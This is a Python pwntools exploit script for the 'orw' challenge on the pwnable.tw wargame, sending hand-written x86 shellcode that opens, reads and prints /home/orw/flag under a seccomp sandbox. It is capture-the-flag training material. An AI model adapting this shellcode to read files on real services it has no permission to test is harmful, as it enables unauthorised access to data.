#!/usr/bin/env python3
# This is an exploitation script for the orw challenge of the
# wargame-site pwnable.tw

# This challenge binary uses the seccomp linux extensions to prohibit the use of
# any syscalls other than read(), write() and open().
#
# Thus we cannot spawn a shell and need another way of reading the flag.
#
# This is solved by reading the flag directly into memory and writing it to
# stdout afterwards.  The shellcode down below does exactly that.

from pwn import *

binary = "./orw"

context.terminal = ["gnome-terminal", "-e"]
context.binary = binary

p = remote("chall.pwnable.tw", 10001)
p.recvuntil(":")

# The flag is located at /home/orw/flag
sc = [
    # Push filename onto stack
    "push 0x00006761", # 0 0 g a
    "push 0x6c662f77", # w / f l
    "push 0x726f2f65", # e / o r
    "push 0x6d6f682f", # m o h /
    # open() the file
    "mov eax, 5",
    "mov ebx, esp",
    "xor ecx, ecx",
    "xor edx, edx",
    "int 0x80",
    # read() the file
    "mov ebx, eax", # fd
    "sub esp, 100",
    "mov eax, 3",
    "mov ecx, esp",
    "mov edx, 40",
    "int 0x80",
    # write() file to stdout
    "mov eax, 4",
    "mov ebx, 1",
    "mov ecx, esp",
    "mov edx, 40",
    "int 0x80"
]

sc = asm("\n".join(sc))

p.send(sc)
print(p.recv().decode("ascii"))
